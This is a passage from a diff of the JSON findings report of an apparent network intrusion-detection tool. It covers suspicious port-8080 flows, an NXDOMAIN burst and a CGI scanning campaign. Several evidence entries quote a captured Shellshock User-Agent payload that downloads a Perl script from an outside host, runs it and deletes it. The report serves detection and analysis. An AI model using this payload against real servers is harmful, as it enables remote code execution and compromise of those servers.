-        "total_bytes": 310
-      },
-      "first_seen": 1428806184.468639,
-      "last_seen": 1428871323.052626
-    },
-    {
-      "type": "suspicious_port",
-      "value": "184.178.44.246:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "184.178.44.246",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 372
-      },
-      "first_seen": 1428806194.859199,
-      "last_seen": 1428871393.600078
-    },
-    {
-      "type": "suspicious_port",
-      "value": "188.112.168.174:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "188.112.168.174",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428806187.513222,
-      "last_seen": 1428806187.513222
-    },
-    {
-      "type": "suspicious_port",
-      "value": "190.164.168.119:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "190.164.168.119",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 186
-      },
-      "first_seen": 1428806164.87504,
-      "last_seen": 1428871374.7015
-    },
-    {
-      "type": "suspicious_port",
-      "value": "190.19.38.165:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "190.19.38.165",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428871430.522205,
-      "last_seen": 1428871433.522102
-    },
-    {
-      "type": "suspicious_port",
-      "value": "190.36.51.201:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "190.36.51.201",
-        "dst_port": 8080,
-        "flow_count": 9,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 4565
-      },
-      "first_seen": 1428806056.907931,
-      "last_seen": 1428871277.26251
-    },
-    {
-      "type": "suspicious_port",
-      "value": "201.213.124.89:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "201.213.124.89",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 248
-      },
-      "first_seen": 1428849557.274467,
-      "last_seen": 1428871352.052752
-    },
-    {
-      "type": "suspicious_port",
-      "value": "201.223.74.111:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "201.223.74.111",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 186
-      },
-      "first_seen": 1428806213.453198,
-      "last_seen": 1428806215.093843
-    },
-    {
-      "type": "suspicious_port",
-      "value": "217.24.65.225:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "217.24.65.225",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428871277.880372,
-      "last_seen": 1428871277.880372
-    },
-    {
-      "type": "suspicious_port",
-      "value": "46.117.70.61:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "46.117.70.61",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428827888.47681,
-      "last_seen": 1428827888.47681
-    },
-    {
-      "type": "suspicious_port",
-      "value": "5.187.40.43:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "5.187.40.43",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428871370.30293,
-      "last_seen": 1428871373.474934
-    },
-    {
-      "type": "suspicious_port",
-      "value": "59.99.66.104:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "59.99.66.104",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 186
-      },
-      "first_seen": 1428806231.96758,
-      "last_seen": 1428871385.068721
-    },
-    {
-      "type": "suspicious_port",
-      "value": "71.95.164.42:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "71.95.164.42",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 122
-      },
-      "first_seen": 1428827933.8679,
-      "last_seen": 1428827934.236777
-    },
-    {
-      "type": "suspicious_port",
-      "value": "77.127.24.90:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "77.127.24.90",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428871353.349657,
-      "last_seen": 1428871353.349657
-    },
-    {
-      "type": "suspicious_port",
-      "value": "77.79.48.222:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "77.79.48.222",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 248
-      },
-      "first_seen": 1428806202.765815,
-      "last_seen": 1428849584.164778
-    },
-    {
-      "type": "suspicious_port",
-      "value": "78.183.199.4:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "78.183.199.4",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428871331.474471,
-      "last_seen": 1428871334.53707
-    },
-    {
-      "type": "suspicious_port",
-      "value": "78.61.80.62:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "78.61.80.62",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428806162.70298,
-      "last_seen": 1428806165.765244
-    },
-    {
-      "type": "suspicious_port",
-      "value": "78.62.0.115:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "78.62.0.115",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 186
-      },
-      "first_seen": 1428827943.164739,
-      "last_seen": 1428871266.083308
-    },
-    {
-      "type": "suspicious_port",
-      "value": "80.230.84.250:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "80.230.84.250",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428871304.537095,
-      "last_seen": 1428871307.411796
-    },
-    {
-      "type": "suspicious_port",
-      "value": "84.228.188.132:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "84.228.188.132",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428871288.817893,
-      "last_seen": 1428871288.817893
-    },
-    {
-      "type": "suspicious_port",
-      "value": "85.132.107.77:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "85.132.107.77",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428827937.695861,
-      "last_seen": 1428827937.695861
-    },
-    {
-      "type": "suspicious_port",
-      "value": "85.242.235.73:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "85.242.235.73",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428871413.506352,
-      "last_seen": 1428871413.506352
-    },
-    {
-      "type": "suspicious_port",
-      "value": "86.100.133.100:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "86.100.133.100",
-        "dst_port": 8080,
-        "flow_count": 4,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 1493
-      },
-      "first_seen": 1428806170.796487,
-      "last_seen": 1428849505.550582
-    },
-    {
-      "type": "suspicious_port",
-      "value": "87.110.212.141:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "87.110.212.141",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428871397.523163,
-      "last_seen": 1428871400.600148
-    },
-    {
-      "type": "suspicious_port",
-      "value": "87.110.7.194:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "87.110.7.194",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 248
-      },
-      "first_seen": 1428827915.820695,
-      "last_seen": 1428871418.756462
-    },
-    {
-      "type": "suspicious_port",
-      "value": "87.69.120.75:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "87.69.120.75",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428827887.929855,
-      "last_seen": 1428827887.929855
-    },
-    {
-      "type": "suspicious_port",
-      "value": "89.117.225.17:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "89.117.225.17",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428827902.452809,
-      "last_seen": 1428827902.452809
-    },
-    {
-      "type": "suspicious_port",
-      "value": "89.180.52.88:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "89.180.52.88",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428806236.969064,
-      "last_seen": 1428806240.140856
-    },
-    {
-      "type": "suspicious_port",
-      "value": "91.131.148.59:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "91.131.148.59",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 310
-      },
-      "first_seen": 1428849553.914238,
-      "last_seen": 1428871378.740463
-    },
-    {
-      "type": "suspicious_port",
-      "value": "91.185.124.44:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "91.185.124.44",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428806223.296877,
-      "last_seen": 1428806223.953218
-    },
-    {
-      "type": "suspicious_port",
-      "value": "92.114.157.117:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "92.114.157.117",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428827930.039526,
-      "last_seen": 1428827930.039526
-    },
-    {
-      "type": "suspicious_port",
-      "value": "92.59.185.108:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "92.59.185.108",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428806175.171571,
-      "last_seen": 1428806175.171571
-    },
-    {
-      "type": "suspicious_port",
-      "value": "93.103.154.193:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "93.103.154.193",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428827877.539175,
-      "last_seen": 1428827877.539175
-    },
-    {
-      "type": "suspicious_port",
-      "value": "94.190.246.233:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "94.190.246.233",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 186
-      },
-      "first_seen": 1428806241.021042,
-      "last_seen": 1428871429.693944
+      "first_seen": null,
+      "last_seen": null
     },
     {
       "type": "nxdomain_burst",
@@ -4933,19 +4359,6 @@
         "src_ip": "192.168.0.53",
         "nxdomain_count": 35,
         "threshold": 5
-      },
-      "first_seen": null,
-      "last_seen": null
-    },
-    {
-      "type": "typosquatting",
-      "value": "apps.skype.com",
-      "confidence": 0.75,
-      "evidence": {
-        "kind": "levenshtein",
-        "brand": "apple",
-        "label": "apps",
-        "queries": 8
       },
       "first_seen": null,
       "last_seen": null
@@ -4985,43 +4398,6 @@
       },
       "first_seen": 1428855293.649645,
       "last_seen": 1428855295.211824
-    },
-    {
-      "type": "script_download",
-      "value": "/cgi-bin/test.sh",
-      "confidence": 0.65,
-      "evidence": {
-        "path": "/cgi-bin/test.sh",
-        "uri_samples": [
-          "/cgi-bin/test.sh"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "extension": ".sh"
-      },
-      "first_seen": 1428844401.143147,
-      "last_seen": 1428844406.905844
     },
     {
       "type": "vulnerable_path",
@@ -5071,27 +4447,95 @@
       "last_seen": 1428871955.733052
     },
     {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/bash",
-      "confidence": 0.5,
+      "type": "web_scanner",
+      "value": "66.135.38.206 -> 192.168.0.2",
+      "confidence": 0.9,
       "evidence": {
-        "path": "/cgi-bin/bash",
-        "uri_samples": [
-          "/cgi-bin/bash"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
+        "src_ip": "66.135.38.206",
+        "dst_ip": "192.168.0.2",
+        "distinct_paths": 22,
+        "total_requests": 22,
+        "top_paths": [
           {
-            "ip": "66.135.38.206",
+            "path": "/cgi-bin/test.sh",
+            "count": 2
+          },
+          {
+            "path": "/cgi-bin/bash",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/contact.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/defaultwebpage.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/env.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/fire.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/forum.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/hello.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/index.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/login.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/main.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/meme.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/php",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/php4",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/php5",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/php5-cli",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/recent.cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/sat-ir-web.pl",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/test-cgi",
+            "count": 1
+          },
+          {
+            "path": "/cgi-bin/test.cgi",
             "count": 1
           }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
         ],
         "hosts": [
           "95.192.215.175"
@@ -5102,855 +4546,10 @@
         "user_agents": [
           "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
         ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
+        "threshold": 10
       },
       "first_seen": 1428844388.983334,
-      "last_seen": 1428844406.903647
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/contact.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/contact.cgi",
-        "uri_samples": [
-          "/cgi-bin/contact.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844389.622899,
-      "last_seen": 1428844406.90366
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/defaultwebpage.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/defaultwebpage.cgi",
-        "uri_samples": [
-          "/cgi-bin/defaultwebpage.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844390.102632,
-      "last_seen": 1428844406.904203
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/env.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/env.cgi",
-        "uri_samples": [
-          "/cgi-bin/env.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844390.582684,
-      "last_seen": 1428844406.903905
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/fire.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/fire.cgi",
-        "uri_samples": [
-          "/cgi-bin/fire.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844391.223297,
-      "last_seen": 1428844406.903664
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/forum.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/forum.cgi",
-        "uri_samples": [
-          "/cgi-bin/forum.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844391.862998,
-      "last_seen": 1428844406.904195
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/hello.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/hello.cgi",
-        "uri_samples": [
-          "/cgi-bin/hello.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844392.265175,
-      "last_seen": 1428844406.904852
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/index.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/index.cgi",
-        "uri_samples": [
-          "/cgi-bin/index.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844392.822687,
-      "last_seen": 1428844406.904199
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/login.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/login.cgi",
-        "uri_samples": [
-          "/cgi-bin/login.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844393.46335,
-      "last_seen": 1428844406.905163
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/main.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/main.cgi",
-        "uri_samples": [
-          "/cgi-bin/main.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844394.103037,
-      "last_seen": 1428844406.904556
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/meme.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/meme.cgi",
-        "uri_samples": [
-          "/cgi-bin/meme.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844394.66323,
-      "last_seen": 1428844406.904564
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/php",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/php",
-        "uri_samples": [
-          "/cgi-bin/php"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844395.044823,
-      "last_seen": 1428844406.90456
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/php4",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/php4",
-        "uri_samples": [
-          "/cgi-bin/php4"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844395.480588,
-      "last_seen": 1428844406.904856
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/php5",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/php5",
-        "uri_samples": [
-          "/cgi-bin/php5"
-        ],
-        "count": 1,
